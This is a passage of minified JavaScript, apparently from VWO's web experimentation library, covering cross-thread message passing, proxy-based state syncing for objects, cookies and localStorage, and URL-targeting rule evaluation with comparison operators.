          return n.type = "vwoWrappedFn_" + (window.mainThread ? "WT" : "MT"), n;
        }
        const o = !!t && /^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2}(?:\.\d*)?)Z$/;
        return JSON.parse(e, function (e, t) {
          var i;
          if (t = Os.reduce((t, n) => n.parse(e, t), t), "string" != typeof t) return t;
          if (t.length < 8) return t;
          if (i = t.substring(0, 7), o && t.match(o)) return new Date(t);
          if ("_NuPreW" === i) {
            const e = t.match(/_NuPreW([0-9]*)_/)[1];
            return window.functionWrapper.unwrap(e);
          }
          if ("_NuFrNf" === i) {
            const e = t.match(/_NuFrNf([0-9]*)_/)[1];
            return n(e);
          }
          if ("_PxEgEr" === i) return eval(t.slice(8));
          if ("_NuFrRa" === i) {
            const e = +t.match(/_NuFrRa([0-9]*)_/)[1];
            return n(e);
          }
          return t;
        });
      },
      clone: function (e, t) {
        return this.parse(this.stringify(e), t);
      }
    };
  let Ts = 0;
  const Cs = {},
    ys = {};
  function Is(e, t, n) {
    var o;
    const i = this.postMessage.bind(this);
    if ("response" === (null === (o = e) || void 0 === o ? void 0 : o.type)) {
      const t = e;
      return {
        resolve: function (e) {
          let n = t.encapsulatedData,
            o = t.isErrorPresent;
          n && (n = "function" == typeof e ? e(t.encapsulatedData) : t.encapsulatedData), o ? ys[t.twoWayCommId](n) : Cs[t.twoWayCommId](n);
        }
      };
    }
    {
      const o = {
        type: "response",
        encapsulatedData: e,
        twoWayCommId: t,
        isErrorPresent: n
      };
      return {
        send: function () {
          try {
            return i(o), !0;
          } catch (e) {
            return !1;
          }
        }
      };
    }
  }
  function As(e) {
    var t;
    if (this.sendingLayer = this.postMessage, "request" === (null === (t = e) || void 0 === t ? void 0 : t.type)) {
      const t = e,
        n = t.encapsulatedData;
      return {
        resolve: e => d(this, void 0, void 0, function* () {
          try {
            const o = yield e(n);
            return Is.call(this, o, t.twoWayCommId).send(), !0;
          } catch (e) {
            const n = Ss.stringify(e.message);
            return Is.call(this, n, t.twoWayCommId, !0).send(), !1;
          }
        })
      };
    }
    {
      const t = {
        type: "request",
        encapsulatedData: e,
        twoWayCommId: ++Ts
      };
      return {
        send: () => new Promise((e, n) => {
          try {
            Cs[t.twoWayCommId] = e, ys[t.twoWayCommId] = n, this.sendingLayer(t);
          } catch (e) {
            console.log(e), n(e);
          }
        })
      };
    }
  }
  class Ns {
    constructor() {
      this.masterObject = {};
    }
    static isObject(e) {
      return "object" == typeof e && !Array.isArray(e) && null !== e;
    }
    static createProxy(e, t, n) {
      if (e.__isProxy || !this.isObject(e)) return e;
      const o = e;
      return Object.defineProperty(o, "__transferData", {
        value: !0,
        enumerable: !1,
        writable: !0
      }), new Proxy(o, {
        set: (e, o, i) => {
          if ("__isProxy" === o || e[o] === i) return !0;
          if (typeof e[o] == typeof i && "function" != typeof i && JSONStringify(i) === JSONStringify(e[o])) return !0;
          if (this.isObject(i) ? e[o] = this.proxify(i, t, n + o.toString() + ".") : e[o] = i, "__transferData" === o || !e.__transferData) return !0;
          const r = {
            path: n + o.toString() + ".",
            value: i
          };
          return r.value = Ss.stringify(i, e), t({
            type: "sync",
            data: r,
            syncType: re.Object
          }), !0;
        },
        get: (e, t) => "__isProxy" === t || e[t],
        deleteProperty: (e, o) => {
          if (o in e) {
            if (delete e[o], !e.__transferData) return !0;
            const i = {
              path: n.toString(),
              key: o
            };
            t({
              type: "sync",
              data: JSONStringify(i),
              syncType: re.Delete
            });
          }
          return !0;
        }
      });
    }
    isKey(e) {
      return e in this.masterObject;
    }
    static proxify(e, t, n) {
      return this.isObject(e) ? (Object.keys(null != e ? e : {}).forEach(o => {
        this.isObject(e[o]) && (e[o] = this.proxify(e[o], t, n + o + "."));
      }), this.createProxy(e, t, n)) : e;
    }
    register(e, t, n) {
      t in this.masterObject && console.error("Key already exists!"), null == e && (e = {});
      const o = Ns.proxify(e, n, t + ".");
      return this.masterObject[t] = {
        proxy: o
      }, o;
    }
    append(e, t) {
      return t in this.masterObject || console.error("Key doesn't exist!"), JSONStringify(e) !== JSONStringify(this.masterObject[t].proxy) && console.error(`The object doesn't match the object registered under the key ${t}!`), this.masterObject[t].proxy;
    }
    static getProxy(e, t, n) {
      return this.proxify(e, t, n + ".");
    }
    static sync(e, t, n, o, i) {
      if (null == e || !e.__isProxy) return e;
      let r = null,
        s = n + ".";
      return 1 === o.length ? (e.__transferData = !1, e[o[0]] = this.proxify(t, i, s + o[0] + "."), e.__transferData = !0, e) : (r = e[o[0]], o.forEach((e, t) => {
        0 !== t && t !== o.length - 1 && (s += e + ".", e in r || (r.__transferData = !1, r[e] = this.proxify({}, i, s), r.__transferData = !0), r = r[e]);
      }), r.__transferData = !1, r[o.pop()] = this.proxify(t, i, s), r.__transferData = !0, e);
    }
  }
  class bs {
    static register(e, t) {
      var n, o, i;
      switch (e) {
        case "cookie":
          if (this.internalUtils.isKeyNonConfigurable("cookie") || (null === (i = null === (o = null === (n = window.VWO._.allSettings.dataStore) || void 0 === n ? void 0 : n.plugins) || void 0 === o ? void 0 : o.DACDNCONFIG) || void 0 === i ? void 0 : i.ckFbk)) return me.enable();
        default:
          this.registerProperty(e, t);
      }
    }
    static registerProperty(e, t) {
      if (document) {
        if (e in window.document) {
          let n;
          if (n = Object.getOwnPropertyDescriptor(window.document, e) || Object.getOwnPropertyDescriptor(window.Document.prototype, e) || Object.getOwnPropertyDescriptor(window.HTMLDocument.prototype, e), !n) return me.enable();
          const o = {
            enumerable: n.enumerable,
            configurable: n.configurable,
            get: () => document["__" + e],
            set: this.internalUtils.getSetter(e, t)
          };
          Object.defineProperty(window.document, "__" + e, n), Object.defineProperty(window.document, e, o), Object.defineProperty(window.Document.prototype, e, o), Object.defineProperty(window.HTMLDocument.prototype, e, o);
        }
      } else console.error("The property doesn't exist on the `DOCUMENT` object.");
    }
    static sync({
      propertyName: e,
      value: t
    }) {
      if ("cookie" === e) return me.isEnabled() ? me.applySyncRequest(t) : Ee(t);
      document[e] = t;
    }
  }
  bs.internalUtils = {
    getSetter: (e, t) => {
      switch (e) {
        case "cookie":
          return new fe().getSetter(t);
        default:
          return n => (JSONStringify(document["__" + e]) === JSONStringify(n) || (document["__" + e] = n, t({
            type: "sync",
            data: {
              propertyName: e,
              value: document["__" + e]
            },
            syncType: re.Document
          })), !0);
      }
    },
    isKeyNonConfigurable: e => {
      var t, n, o;
      const i = [document, null === (t = null === window || void 0 === window ? void 0 : window.Document) || void 0 === t ? void 0 : t.prototype, null === (n = null === window || void 0 === window ? void 0 : window.HTMLDocument) || void 0 === n ? void 0 : n.prototype];
      for (let t = 0; t < i.length; t++) if (!1 === (null === (o = Object.getOwnPropertyDescriptor(i[t] || {}, e)) || void 0 === o ? void 0 : o.configurable)) return !0;
      return !1;
    }
  };
  class Vs {
    static register(e, t, n, o) {
      n in e ? console.error("The property must not pre-exist inside the object.") : Object.defineProperty(e, n, {
        enumerable: !0,
        configurable: !1,
        get: () => e[`__${n}`],
        set: i => (e[`__${n}`] = i, o({
          type: "sync",
          data: {
            identifier: t,
            property: n,
            value: i
          },
          syncType: re.Property
        }), !0)
      });
    }
  }
  function Rs() {
    {
      const e = window.fetcher.postMessage.bind(window.fetcher),
        t = {
          _setItem: (t, n) => {
            if (window.localStorage.getItem(t) !== n) return window.localStorage.setItem(t, n), e({
              data: {
                key: t,
                value: n
              },
              type: "sync",
              syncType: {
                type: "custom",
                method: "localStorage",
                operation: "setItem"
              }
            }), null;
          },
          _removeItem: t => {
            null !== window.localStorage.getItem(t) && (window.localStorage.removeItem(t), e({
              data: {
                key: t
              },
              type: "sync",
              syncType: {
                type: "custom",
                method: "localStorage",
                operation: "removeItem"
              }
            }));
          },
          _clear: () => {
            0 !== Object.keys(window.localStorage).length && (window.localStorage.clear(), e({
              data: {},
              type: "sync",
              syncType: {
                type: "custom",
                method: "localStorage",
                operation: "clear"
              }
            }));
          }
        };
      gi(t), m(t);
    }
  }
  function Ls(e) {
    if ("number" != typeof e.syncType) {
      switch (window.localStorage.__transferData && (window.localStorage.__transferData = !1), e.syncType.operation) {
        case "setItem":
          window.localStorage.setItem(e.data.key, e.data.value);
          break;
        case "removeItem":
          window.localStorage.removeItem(e.data.key);
          break;
        case "clear":
          window.localStorage.clear();
          break;
        default:
          return;
      }
      window.localStorage.__transferData && (window.localStorage.__transferData = !0);
    }
  }
  class Ps {}
  Ps.syncLocalStorage = Rs;
  class Ds extends Ps {
    constructor() {
      super(), this.objectSyncer = new Ns();
    }
    register(e, t, n = {}, o = "", i = !1) {
      if ("object" != typeof n || Array.isArray(n)) return;
      const r = window.fetcher.postMessage.bind(window.fetcher);
      switch (e) {
        case "custom":
          switch (t) {
            case "localStorage":
              Ds.syncLocalStorage();
              break;
            default:
              throw new Error("Unknown property name!");
          }
          break;
        case re.Object:
          {
            const e = this.objectSyncer.register(n, t, r);
            return i && r({
              data: {
                value: JSONStringify(n),
                path: t
              },
              type: "sync",
              syncType: re.OverWrite
            }), e;
          }
        case re.Property:
          Vs.register(n, o, t, r);
          break;
        case re.Document:
          bs.register(t, r);
          break;
        default:
          console.error("Unknown 'syncAblesEnum' type!");
      }
    }
    append(e, t) {
      return this.objectSyncer.append(e, t);
    }
    static sync(e, t) {
      var n;
      const {
        data: o
      } = e;
      if ("object" != typeof e.syncType || "custom" !== e.syncType.type) switch (e.syncType) {
        case re.Object:
          {
            o.value = Ss.parse(o.value);
            const e = o.path.substring(0, o.path.lastIndexOf(".")).split(".");
            window[e[0]] = Ns.sync(window[e[0]], o.value, e[0], e.splice(1), t);
            break;
          }
        case re.Document:
          bs.sync(o);
          break;
        case re.Property:
        case re.Variable:
          t(o);
          break;
        case re.OverWrite:
          if (!("__transferData" in (null !== (n = window[o.path]) && void 0 !== n ? n : {}))) return void (window[o.path] = JSON.parse(o.value));
          window[o.path] = Ns.getProxy(JSON.parse(o.value), t, o.path);
          break;
        case re.Delete:
          {
            const e = JSON.parse(o),
              t = e.path.substring(0, e.path.lastIndexOf(".")).split(".").reduce((e, t) => Object.keys(e).length ? e[t] : window[t], {}),
              n = e.key;
            n in t && (t.__transferData = !1, delete t[n], t.__transferData = !0);
            break;
          }
        default:
          console.error("Unknown 'syncAblesEnum' type!");
      } else switch (e.syncType.method) {
        case "localStorage":
          Ls(e);
          break;
        default:
          return;
      }
    }
    declare(e, t) {
      Vs.register(window, "window", e, t);
    }
  }
  const xs = window.VWOEventsArchInCompatibilityMode,
    Us = (e, t) => {
      if (e && "function" == typeof e && e.bind) try {
        e = e.bind(t);
      } catch (t) {
        if (/(cannot be invoked without 'new')|(Cannot call a class constructor without |new|)/i.test(t.message)) return e;
        console.error(t);
      }
      return e;
    };
  function ks(e, t, n = {}) {
    if ("window" === e) return window;
    let o = window;
    const {
        captureGroups: i = null,
        filter: r
      } = n,
      s = e.split("."),
      a = s.length;
    for (let e = 0; e < a; e++) {
      let t = s[e];
      if (t.endsWith(")")) {
        const e = t.substring(0, t.indexOf("("));
        let n = t.substring(t.indexOf("("));
        n = "[" + n.slice(1, n.length - 1) + "]";
        const r = n.slice(1, n.length - 1).split(",");
        r.forEach((e, t) => {
          e.startsWith('"') || (r[t] = '"vwoCurrThreadRef' + e + '"');
        });
        const s = JSON.parse(n, (e, t) => {
          let n;
          if ("string" == typeof t) {
            if (n = t.match(/\${{([0-9]*)}}/)) return i[n[1] - 1];
            if (n = t.match(/vwoCurrThreadRef(.*)/)) return ks(n[1]);
          }
          return t;
        });
        o = o[e](...s);
      } else {
        let e = !1;
        t.endsWith("?") && (t = t.slice(0, -1), e = !0);
        const n = o[t];
        if (o = Us(n, o), e && null == o) return o;
      }
    }
    if (r) {
      const e = {};
      r.forEach(t => {
        e[t] = o[t];
      }), o = e;
    }
    return o;
  }
  const Ws = function (e) {
      return window.functionWrapper.unwrap(e.id)(...Ss.parse(e.args));
    },
    Ms = function (e) {
      var t, n;
      return d(this, void 0, void 0, function* () {
        switch (e.type) {
          case "callWrappedFunction":
            {
              const t = Ws(e);
              return Ss.stringify(t);
            }
          case "vwoClassInstanceBridge":
            {
              const t = e.path.dest.lastIndexOf(".");
              let n = window,
                o = e.path.dest;
              -1 !== t && (n = ks(e.path.dest.slice(0, t)), o = e.path.dest.substr(t + 1));
              const i = n[o],
                [r, s] = new i(...e.args);
              return s.otherSide = (...t) => {
                const n = e.path.src + "." + r + "." + t[0];
                return t[0] = n, window.fetcher.getValue(...t);
              }, "" + r;
            }
          default:
            {
              let o, i;
              if ("setValue" === (e = Ss.parse(e)).type) {
                -1 == e.path.lastIndexOf(".") && (e.path = "window." + e.path);
                const t = e.path;
                e.path = t.slice(0, t.lastIndexOf(".")), o = t.slice(t.lastIndexOf(".") + 1);
              }
              (null === (t = e.config) || void 0 === t ? void 0 : t.captureGroups) && (e.config.captureGroups = Ss.parse(e.config.captureGroups));
              const r = i = ks(e.path, e.args, null == e ? void 0 : e.config);
              return (null === (n = e.config) || void 0 === n ? void 0 : n.constructable) ? i = new r(...e.args) : "function" == typeof r && (i = r(...(e.args || []))), o && (i = r[o] = e.val), i = yield i, Ss.stringify(i);
            }
        }
      });
    };
  class Gs {}
  class $s extends Gs {
    init() {
      var e, t, n;
      this.thread = (null === (t = null === (e = window) || void 0 === e ? void 0 : e.mainThread) || void 0 === t ? void 0 : t.webWorker) || (null === (n = window) || void 0 === n ? void 0 : n.workerThread), this.request = As, this.response = Is, this.thread.onmessage = this.onMessage.bind(this);
    }
    onMessage(e) {
      var t, n, o, i;
      const {
        data: r
      } = e;
      switch (r.type) {
        case "initDone":
          window.vwo_initDone(r);
          break;
        case "request":
          this.request(r).resolve(Ms);
          break;
        case "response":
          this.response(r).resolve(Ss.parse.bind(Ss));
          break;
        case "sync":
          {
            let e = e => null;
            switch (r.syncType) {
              case re.OverWrite:
              case re.Object:
                e = this.postMessage.bind(this);
                break;
              case re.Property:
              case re.Document:
              case re.Variable:
              case re.Delete:
            }
            Ds.sync(r, e);
            break;
          }
        default:
          window.VwoUnitTestsRunning && ("unit-test" === r.type ? eval(r.code) : "unit-test-result" === r.type && (null === (n = null === (t = window.PromiseResolver) || void 0 === t ? void 0 : t[r.id]) || void 0 === n || n.resolve(r))), null === (i = (o = this.thread)._onMessage) || void 0 === i || i.call(o, e);
      }
    }
    postMessage(e) {
      try {
        this.thread.postMessage(e);
      } catch (e) {
        console.error(e);
      }
    }
    getValue(e, t, n = {}) {
      let o;
      (null == n ? void 0 : n.captureGroups) && (o = Ss.stringify(n.captureGroups));
      const i = {
        path: e,
        args: t,
        config: Object.assign(Object.assign({}, n), {
          captureGroups: o
        })
      };
      return this.request(Ss.stringify(i)).send();
    }
    setValue(e, t) {
      const n = {
        type: "setValue",
        path: e,
        val: t
      };
      return this.request(Ss.stringify(n)).send();
    }
  }
  class Fs extends Gs {
    init() {}
    onMessage() {}
    postMessage() {
      this.onMessage.apply(this, arguments);
    }
    getValue(e, t, n = {}) {
      return new Promise(n => {
        t ? Array.isArray(t) ? n(window[e](...t)) : t.captureGroups.forEach((t, n) => {
          e.replace(`{{${n}}}`, Ss.parse(t));
        }) : n(e);
      });
    }
    setValue(e, t) {
      return window[e] = t;
    }
  }
  const js = xs ? Fs : $s;
  window.fetcher = new js();
  class Bs {
    constructor() {
      this.storageLookUpKey = "_vwo_store_content";
    }
    otherSide(...e) {
      return e[0] = "VWO.modules.vwoUtils.contentSync." + e[0], e[2] && (e[2] = {
        captureGroups: e[2]
      }), window.fetcher.getValue(...e);
    }
  }
  class Hs extends Bs {
    constructor() {
      super(...arguments), this.collectedData = {}, this.requestsChecker = {};
    }
    updateStorage() {
      return d(this, void 0, void 0, function* () {
        if (!this.response) return;
        const e = JSON.parse(this.response);
        oe(e).length && (yield window.fetcher.getValue("VWO._.contentSyncService.updateStorage", [e]));
      });
    }
    syncFromBackend(e, t, n, o) {
      const [i, r] = e.split(".");
      if (this.collectedData[i] = this.collectedData[i] || {}, this.collectedData[i][r] = this.collectedData[i][r] || [], this.requestsChecker[n]) return;
      this.requestsChecker[n] = 1, this.collectedData[i][r].push(t);
      const s = this;
      this.debouncedCall = this.debouncedCall || ct(function () {
        return d(this, void 0, void 0, function* () {
          so({
            url: o + "sync?a=" + window._vwo_acc_id,
            data: JSONStringify(s.collectedData),
            success: s.updateStorage
          }), s.collectedData = {};
        });
      }, 0), this.debouncedCall();
    }
  }
  window.VWO.modules.vwoUtils.contentSync = new Hs();
  class Ks {
    get(e) {
      return this[e];
    }
    set(e, t) {
      this[e] = t;
    }
  }
  var Js = new Ks(),
    Ys;
  !function (e) {
    e[e.EXCLUDE_PASSED = 1] = "EXCLUDE_PASSED", e[e.INCLUDE_PASSED = 2] = "INCLUDE_PASSED", e[e.INCLUDE_FAILED = 3] = "INCLUDE_FAILED";
  }(Ys || (Ys = {}));
  var qs = Ys,
    Xs;
  !function (e) {
    e.OR = "o", e.AND = "a";
  }(Xs || (Xs = {}));
  var zs = Xs;
  class Zs {
    constructor() {
      this.experimentConfig = {}, this.pageConfig = {}, this.experimentConfigCache = {}, this.pageConfigCache = {}, this.previewParamsCleanedUrlCache = {}, Zs.cleanerRegex = /(^https?:\/\/)?(w{3}\.)?(.*?)?((?:\/)(?:home|default|index)\.\w{3,4})?(\/)?([?#].*)?$/i, Zs.logicalOperators = [zs.AND, zs.OR];
    }
    static get currentUrl() {
      return window.location.href;
    }
    add(e, t) {
      if (Ui.debug("Adding pageGroup config to phoenix"), _e(e) && (Object.hasOwnProperty.call(e, "ec") && e.ec.forEach(e => {
        const t = Object.keys(e)[0];
        this.experimentConfig[t] || (this.experimentConfig[t] = e[t]);
      }), Object.hasOwnProperty.call(e, "pc") && e.pc.forEach(e => {
        const t = Object.keys(e)[0];
        this.pageConfig[t] || (this.pageConfig[t] = e[t]);
      })), _e(t)) {
        if (le(t.pc)) {
          const e = this.getCache(Zs.currentUrl, !0);
          t.pc.forEach(t => {
            e[t] = {
              didMatch: !0,
              reason: qs.INCLUDE_PASSED,
              cacheHit: !0
            };
          });
        }
        if (le(t.ec)) {
          const e = this.getCache(Zs.currentUrl);
          t.ec.forEach(t => {
            e[t] = {
              didMatch: !0,
              reason: qs.INCLUDE_PASSED,
              cacheHit: !0
            };
          });
        }
      }
    }
    getCache(e, t) {
      return t ? (this.pageConfigCache = this.pageConfigCache || {}, this.pageConfigCache[e] = this.pageConfigCache[e] || {}, this.pageConfigCache[e]) : (this.experimentConfigCache = this.experimentConfigCache || {}, this.experimentConfigCache[e] = this.experimentConfigCache[e] || {}, this.experimentConfigCache[e]);
    }
    getPreviewParamsCleanedUrl(e) {
      return e ? (this.previewParamsCleanedUrlCache = this.previewParamsCleanedUrlCache || {}, this.previewParamsCleanedUrlCache[e] || (this.previewParamsCleanedUrlCache[e] = Js.get("jsLibUtils").getCleanedUrl(e, !0)), this.previewParamsCleanedUrlCache[e]) : e;
    }
    getIndexFileCleanedUrl(e) {
      return e ? (this.indexFileCleanedUrlCache = this.indexFileCleanedUrlCache || {}, this.indexFileCleanedUrlCache[e] || (this.indexFileCleanedUrlCache[e] = e.replace(Zs.cleanerRegex, "$1$2$3$5$6")), this.indexFileCleanedUrlCache[e]) : e;
    }
    validatePage(e, t, n, o) {
      const i = t ? this.pageConfig[e] : this.experimentConfig[e];
      if (!i) return Ui.info(`ConfigId ${e} is not present inside ${t ? "pageConfig" : "experimentConfig"}`), {
        didMatch: !1,
        reason: qs.INCLUDE_FAILED,
        cacheHit: !1
      };
      const r = n || Zs.currentUrl,
        s = this.getCache(r, t);
      if (s && Object.hasOwnProperty.call(s, e)) return Ui.info(`Fetching value from cache for ${t ? "pageConfigId" : "experimentConfigId"} = ${e}`), s[e].cacheHit = !0, s[e];
      let a;
      const c = i.exc,
        d = i.inc;
      if (Array.isArray(c) && c.length > 0) {
        const t = this.evaluateDSL(c, r, o || !1);
        if (t) return a = {
          didMatch: !t,
          reason: qs.EXCLUDE_PASSED,
          cacheHit: !1
        }, o || (s[e] = a), a;
      }
      if (Array.isArray(d)) if (d.length) {
        const e = this.evaluateDSL(d, r, o || !1);
        a = e ? {
          didMatch: e,
          reason: qs.INCLUDE_PASSED,
          cacheHit: !1
        } : {
          didMatch: e,
          reason: qs.INCLUDE_FAILED,
          cacheHit: !1
        };
      } else a = {
        didMatch: !0,
        reason: qs.INCLUDE_PASSED,
        cacheHit: !1
      };
      return a = a || {
        didMatch: !1,
        reason: qs.INCLUDE_FAILED,
        cacheHit: !1
      }, o || (s[e] = a), a;
    }
    evaluateDSL(e, t, n) {
      if (!le(e) || e.length < 2) return Ui.error("Invalid dsl tree", e), !1;
      const o = [];
      return e.forEach(e => {
        var i;
        let r;
        if (e || (r = !1), pe(e) && (r = e), le(e)) if (Zs.logicalOperators.includes(e[0])) r = this.evaluateDSL(e, t, n);else {
          const [o, s, ...a] = e,
            c = null === (i = Wi.plugins[Mi.OPERATOR]) || void 0 === i ? void 0 : i.get(s);
          let d;
          if (o.includes("url")) d = this.getIndexFileCleanedUrl(this.getPreviewParamsCleanedUrl(t));else {
            const e = a[0];
            d = this.validatePage(e, !0, t, n).didMatch, a[0] = !0;
          }
          r = null == c ? void 0 : c(d, ...a, {
            jsLibUtils: Js.get("jsLibUtils"),
            pageUrl: !0
          });
        }
        o.push(r || !1);
      }), this.evaluateTree(o);
    }
    evaluateTree(e) {
      let t = !1;
      switch (e[0]) {
        case zs.AND:
          t = !e.includes(!1);
          break;
        case zs.OR:
          t = e.includes(!0);
      }
      return t;
    }
  }
  var Qs = new Zs();
  const ea = {
      UNKNOWN_SET_API_TYPE: "Unknown type '{{type}}' found in set API.",
      EVENTS: {
        ALREADY_EXISTS: "Event with name '{{eventName}}' already exists. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Event with name '{{eventName}}' has not been registered yet. Please use 'add' API to register it."
      },
      OPERATORS: {
        ALREADY_EXISTS: "Operator with name '{{operatorName}}' already exists. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Operator with name '{{operatorName}}' has not been registered yet. Please use 'add' API to register it."
      },
      FORMULAS: {
        ALREADY_EXISTS: "Formula with name '{{formulaName}}' already exists. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Formula with name '{{formulaName}}' has not been registered yet. Please use 'add' API to register it."
      },
      STORAGES: {
        ALREADY_EXISTS: "Storage with name '{{storageName}}' already exists. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Storage with name '{{storageName}}' has not been registered yet. Please use 'add' API to register it."
      },
      TAGS: {
        ALREADY_EXISTS: "Tag with name '{{tagName}}' already exists. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Tag with name '{{tagName}}' has not been registered yet. Please use 'add' API to register it."
      },
      EVENT_PROP: {
        ALREADY_EXISTS: "Event property with name '{{propName}}' already exists for event '{{eventName}}'. Please use 'update' API if you want to override it.",
        NOT_REGISTERED: "Event property with name '{{propName}}' has not been registered yet for event '{{eventName}}'. Please use 'add' API to register it."
      }
    },
    ta = {
      EVENTS: {
        NO_EVENT_TO_REMOVE: "Unable to remove Event '{{eventName}}' as it's not been registered."
      },
      OPERATORS: {
        NO_OPERATOR_TO_REMOVE: "Unable to remove Operator '{{operatorName}}' as it's not been registered."
      },
      FORMULAS: {
        NO_FORMULA_TO_REMOVE: "Unable to remove Formula '{{formulaName}}' as it's not been registered."
      },
      STORAGES: {
        NO_STORAGE_TO_REMOVE: "Unable to remove Storage '{{storageName}}' as it's not been registered."
      },
      TAGS: {
        NO_TAG_TO_REMOVE: "Unable to remove Tag '{{tagName}}' as it's not been registered."
      },
      EVENT_PROP: {
        NO_EVENT_PROP_TO_REMOVE: "Unable to remove Event property '{{propName}}' for event '{{eventName}}' as it's not been registered."
      }
    };
  class na extends Gi {
    constructor() {
      super(), this.pluginName = Mi.OPERATOR, this.operators = {};
    }
    add(e, t) {
      Ui.debug(`Adding operator '${e}' in OperatorsManager`), this.operators[e] ? Ui.error(ea.OPERATORS.ALREADY_EXISTS, {
        operatorName: e
      }) : this.operators[e] = t;
    }
    update(e, t) {
      Ui.debug(`Updating operator '${e}' in OperatorsManager`), this.operators[e] = t;
    }
    get(e) {
      return Ui.debug(`Getting operator '${e}' in OperatorsManager`), this.operators[e] ? this.operators[e] : (Ui.error(ea.OPERATORS.NOT_REGISTERED, {
        operatorName: e
      }), null);
    }
    remove(e) {
      Ui.debug(`Removing operator '${e}' in OperatorsManager`), this.operators[e] ? delete this.operators[e] : Ui.warn(ta.OPERATORS.NO_OPERATOR_TO_REMOVE, {
        operatorName: e
      });
    }
    removeAll() {
      Ui.debug("Removing all operators in OperatorsManager"), this.operators = {};
    }
    initialize(e) {
      Object.assign(this.operators, e);
    }
  }
  var oa = new na(),
    ia,
    ra;
  !function (e) {
    e.EQUAL = "eq", e.NOT_EQUAL = "neq", e.EQUAL_CASE_SENSITIVE = "eqs", e.NOT_EQUAL_CASE_SENSITIVE = "neqs", e.REGEX = "reg", e.REGEX_CASE_SENSITIVE = "regs", e.CONTAINS = "cn", e.NOT_CONTAINS = "ncn", e.BLANK = "bl", e.NOT_BLANK = "nbl", e.GREATER_THAN = "gt", e.LESS_THAN = "lt", e.GREATER_THAN_EQUAL = "gte", e.LESS_THAN_EQUAL = "lte", e.IN = "in", e.NOT_IN = "nin", e.EXEC = "exec", e.SELECTOR = "sel", e.IN_LOCATION = "inloc", e.NOT_IN_LOCATION = "ninloc", e.URL_REGEX = "urlReg", e.NOT_URL_REGEX = "nUrlReg", e.RANGE_COMPARISON = "rg", e.PAGE_CONFIG_EVALUATION = "pgc";
  }(ia || (ia = {})), function (e) {
    e.PAGE = "PAGE", e.EVENT = "EVENT", e.JS_VARIABLE = "JS_VARIABLE";
  }(ra || (ra = {}));
  const sa = {
    [ia.EQUAL]: (e, t) => String(e).toLowerCase() === String(t).toLowerCase(),
    [ia.NOT_EQUAL]: (e, t) => !sa[ia.EQUAL](e, t),
    [ia.EQUAL_CASE_SENSITIVE]: (e, t) => String(e) === String(t),
    [ia.NOT_EQUAL_CASE_SENSITIVE]: (e, t) => !sa[ia.EQUAL_CASE_SENSITIVE](e, t),
    [ia.REGEX](e, t) {
      try {
        return new RegExp(t, "i").test(String(e));
      } catch (e) {
        return !1;
      }
    },
    [ia.URL_REGEX](e, t, n) {
      const o = null == n ? void 0 : n.jsLibUtils;
      return o ? o.verifyUrl(e, t, null, null == n ? void 0 : n.pageUrl) : sa[ia.REGEX](e, t);
    },
    [ia.NOT_URL_REGEX]: (e, t, n) => !sa[ia.URL_REGEX](e, t, n),
    [ia.REGEX_CASE_SENSITIVE](e, t) {
      try {
        return new RegExp(t).test(String(e));
      } catch (e) {
        return !1;
      }
    },
    [ia.CONTAINS]: (e, t) => String(e).toLowerCase().includes(String(t).toLowerCase()),
    [ia.NOT_CONTAINS]: (e, t) => !sa[ia.CONTAINS](e, t),
    [ia.BLANK]: e => !e,
    [ia.NOT_BLANK]: e => !sa[ia.BLANK](e),
    [ia.GREATER_THAN](e, t) {
      if (!_e(e) || !_e(t)) return !1;
      const n = +e,
        o = +t;
      return ge(n) && ge(o) && n > o;
    },
    [ia.GREATER_THAN_EQUAL](e, t) {
      if (!_e(e) || !_e(t)) return !1;
      const n = +e,
        o = +t;
      return ge(n) && ge(o) && n >= o;
    },
    [ia.LESS_THAN](e, t) {
      if (!_e(e) || !_e(t)) return !1;
      const n = +e,
        o = +t;
      return ge(n) && ge(o) && n < o;
    },
    [ia.LESS_THAN_EQUAL](e, t) {
      if (!_e(e) || !_e(t)) return !1;
      const n = +e,
        o = +t;
      return ge(n) && ge(o) && n <= o;
    },
    [ia.NOT_IN_LOCATION](e, t) {
      let n = !1;
      if (!t || 0 === t.length) return !1;
      for (let o = 0; o < t.length; o++) {
        const i = t[o];
        if (i === e.countryCode || i === `${e.countryCode}-${e.region}` || i === `${e.countryCode}-${e.region}-${e.city}`) {
          n = !1;
          break;
        }
        n = !0;
      }
      return n;
    },
    [ia.IN_LOCATION](e, t) {
      let n = !1;
      if (!t || 0 === t.length) return !1;
      for (let o = 0; o < t.length; o++) {
        const i = t[o];
        if (i === e.countryCode || i === `${e.countryCode}-${e.region}` || i === `${e.countryCode}-${e.region}-${e.city}`) {
          n = !0;
          break;
        }
      }
      return n;
    },
    [ia.IN]: (e, t) => t.map(e => String(e).toLowerCase()).includes(String(e).toLowerCase()),
    [ia.NOT_IN]: (e, t) => !sa[ia.IN](e, t),
    [ia.RANGE_COMPARISON](e, t) {
      try {
        const n = JSON.parse(e),
          o = t.split("'")[1].split("-"),
          i = o[0],
          r = o[1];
        return sa[ia.GREATER_THAN_EQUAL](n[0], parseInt(i, 10)) && sa[ia.LESS_THAN_EQUAL](n[0], parseInt(r, 10));
      } catch (e) {
        return Ui.info(`RANGE OPERATOR ERROR: ${e && e.stack}`), !1;
      }
    },
    [ia.PAGE_CONFIG_EVALUATION]: (e, t) => Qs.validatePage(t, !1, e).didMatch
  };
  var aa = Object.assign(sa, {
    sel(e, t) {
      try {
        return !!e.closest(t);
      } catch (e) {
        return !1;
      }
    }
  });
  oa.initialize(aa);
  class ca {
    constructor() {
      this.listenerAdded = !1, this.queue = new Set();
    }
    addListener(e) {
      this.queue.add(e), this.listenerAdded || (window.addEventListener("storage", e => {
        this.queue.has(e.key) && this.otherSide("processQueue", [e.key, e.newValue]);
      }), this.listenerAdded = !0);
    }
    otherSide(...e) {
      e[0] = "VWO.modules.utils.storageSyncer." + e[0], window.fetcher.getValue(...e);
    }
  }
  const da = new ca();
  function la(e, t) {
    window.VWO.phoenix('store.actions.addValues("${{1}}", "${{2}}")', null, {
      captureGroups: [e, t]
    });
  }
  window.VWO.modules.utils.storageSyncer = da;
  const ua = function () {
      const e = {},
        {
          campaigns: t
        } = window.VWO._.allSettings.dataStore;
      let n = "";
